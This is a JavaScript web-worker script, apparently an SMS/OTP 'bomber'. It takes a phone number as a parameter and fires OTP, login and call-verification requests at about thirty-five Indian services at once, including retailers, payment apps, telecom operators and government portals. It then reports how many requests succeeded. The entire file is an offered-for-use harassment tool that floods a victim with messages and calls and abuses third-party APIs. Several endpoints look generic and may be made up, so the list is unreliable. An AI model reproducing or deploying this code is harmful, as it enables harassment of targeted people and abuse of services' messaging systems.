export default {
  async fetch(request) {
    const { searchParams } = new URL(request.url);
    const mobile = searchParams.get("mobile");

    if (!mobile) {
      return new Response("❌ Missing 'mobile' parameter", { status: 400 });
    }

    const payloads = [
      // Samsung
      {
        url: "https://www.samsung.com/in/api/v1/sso/otp/init",
        method: "POST",
        body: { user_id: mobile }
      },
      
      // Swiggy
      {
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        body: { mobile: mobile }
      },
      
      // Bomber Tools
      {
        url: `https://bomber-tools.xyz/?mobile=${mobile}&accesskey=bombersmm&submit=Submit`,
        method: "GET"
      },
      
      // OLX
      {
        url: "https://www.olx.in/api/auth/authenticate?lang=en-IN",
        method: "POST",
        body: {
          method: "call",
          phone: `+91${mobile}`,
          language: "en-IN",
          grantType: "retry"
        }
      },
      
      // PropTiger
      {
        url: "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
        method: "POST",
        body: { contactNumber: mobile, domainId: "2" }
      },
      
      // Meesho
      {
        url: "https://www.meesho.com/api/v1/user/login/request-otp",
        method: "POST",
        body: { phone_number: mobile }
      },
      
      // PhonePe
      {
        url: "https://aa-interface.phonepe.com/apis/aa-interface/users/otp/trigger",
        method: "POST",
        body: { rmn: mobile, purpose: "REGISTRATION" }
      },
      
      // Rupaiya Raja
      {
        url: `https://rupaiyaraja.com/9987/src/api/otp.php?num=${mobile}`,
        method: "GET"
      },
      
      // TLLMS
      {
        url: "https://identity.tllms.com/api/request_otp",
        method: "POST",
        body: {
          feature: "",
          phone: `+91${mobile}`,
          type: "sms",
          app_client_id: "null"
        }
      },
      
      // Country Delight
      {
        url: "https://api.countrydelight.in/api/auth/new_request_otp",
        method: "POST",
        body: { new_user: true, mobile_no: mobile }
      },
      
      // More Retail
      {
        url: "https://omni-api.moreretail.in/api/v1/login/",
        method: "POST",
        body: { hash_key: "XfsoCeXADQA", phone_number: mobile }
      },
      
      // Khatabook
      {
        url: "https://api.khatabook.com/v1/auth/request-otp",
        method: "GET"
      },
      
      // Trinkerr
      {
        url: "https://prod-backend.trinkerr.com/api/v1/web/traders/generateOtpForLogin",
        method: "POST",
        body: { mobile: mobile, otpOperationType: "SignUp" }
      },
      
      // Doubtnut
      {
        url: "https://api.doubtnut.com/v4/student/login",
        method: "POST",
        body: { is_web: "3", phone_number: mobile }
      },
      
      // My11Circle
      {
        url: "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        method: "POST",
        body: {
          isPlaycircle: false,
          mobile: mobile,
          deviceId: "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1",
          deviceName: "",
          refCode: ""
        }
      },
      
      // DocTime
      {
        url: "https://admin.doctime.com.bd/api/otp/send",
        method: "POST",
        body: { contact: mobile }
      },
      
      // Eat-Z
      {
        url: "https://api.eat-z.com/auth/customer/signin",
        method: "POST",
        body: { username: mobile }
      },
      
      // PenPencil
      {
        url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        method: "POST",
        body: {
          organizationId: "5eb393ee95fab7468a79d189",
          mobile: mobile
        }
      },
      
      // RummyCircle
      {
        url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        method: "POST",
        body: {
          isPlaycircle: false,
          mobile: mobile,
          deviceId: "6ebd671c-a5f7-4baa-904b-89d4f898ee79",
          deviceName: "",
          refCode: ""
        }
      },
      
      // Telecom Providers
      {
        url: "https://www.jio.com/api/v1/otp/send",
        method: "POST",
        body: { mobile: `91${mobile}` }
      },
      {
        url: "https://www.airtel.in/app-api/v1/otp",
        method: "POST",
        body: { mobile: `91${mobile}` }
      },
      {
        url: "https://www.myvi.in/api/v1/otp/send",
        method: "POST",
        body: { mobile: `91${mobile}` }
      },
      {
        url: "https://www.bsnl.co.in/api/v1/otp/send",
        method: "POST",
        body: { mobile: `91${mobile}` }
      },
      {
        url: "https://www.mtnl.in/api/v1/otp/send",
        method: "POST",
        body: { mobile: `91${mobile}` }
      },
      
      // Payment & Travel
      {
        url: "https://auth.uber.com/v3/oauth/otp",
        method: "POST",
        body: { mobile: `+91${mobile}` }
      },
      {
        url: "https://www.makemytrip.com/api/v1/otp/send",
        method: "POST",
        body: { phone: `91${mobile}` }
      },
      {
        url: "https://www.goibibo.com/api/v1/auth/otp",
        method: "POST",
        body: { phone: `91${mobile}` }
      },
      {
        url: "https://www.phonepe.com/apis/hermes/v1/auth/send_otp",
        method: "POST",
        body: { phone: `+91${mobile}` }
      },
      {
        url: "https://netbanking.paytmbank.com/api/v1/otp",
        method: "POST",
        body: { mobile: `91${mobile}` }
      },
      
      // Government Services
      {
        url: "https://uidai.gov.in/api/v1/otp/send",
        method: "POST",
        body: { aadhaar: mobile }
      },
      {
        url: "https://www.digilocker.gov.in/api/v1/otp/send",
        method: "POST",
        body: { mobile: `91${mobile}` }
      },
      
      // Social Media
      {
        url: "https://api.whatsapp.com/v1/otp/send",
        method: "POST",
        body: { phone: `91${mobile}` }
      },
      {
        url: "https://www.sharechat.com/api/v1/otp/send",
        method: "POST",
        body: { phone: `91${mobile}` }
      },
      {
        url: "https://www.chingari.io/api/v1/otp/send",
        method: "POST",
        body: { phone: `91${mobile}` }
      },
      {
        url: "https://www.mojapp.in/api/v1/otp/send",
        method: "POST",
        body: { phone: `91${mobile}` }
      }
    ];

    const results = await Promise.allSettled(
      payloads.map(api => {
        const options = {
          method: api.method,
          headers: {
            "Content-Type": "application/json",
            ...api.headers
          }
        };
        
        if (api.method === "POST") {
          options.body = JSON.stringify(api.body);
        }
        
        return fetch(api.url, options);
      })
    );

    const summary = results.map((res, i) => ({
      service: new URL(payloads[i].url).hostname.replace('www.', ''),
      url: payloads[i].url,
      method: payloads[i].method,
      status: res.status,
      success: res.status === "fulfilled" && res.value?.ok,
      statusCode: res.status === "fulfilled" ? res.value.status : null
    }));

    return new Response(JSON.stringify({
      success: true,
      mobile: mobile,
      totalRequests: payloads.length,
      successfulRequests: summary.filter(s => s.success).length,
      failedRequests: summary.filter(s => !s.success).length,
      results: summary
    }, null, 2), {
      headers: { 
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*"
      }
    });
  }
};
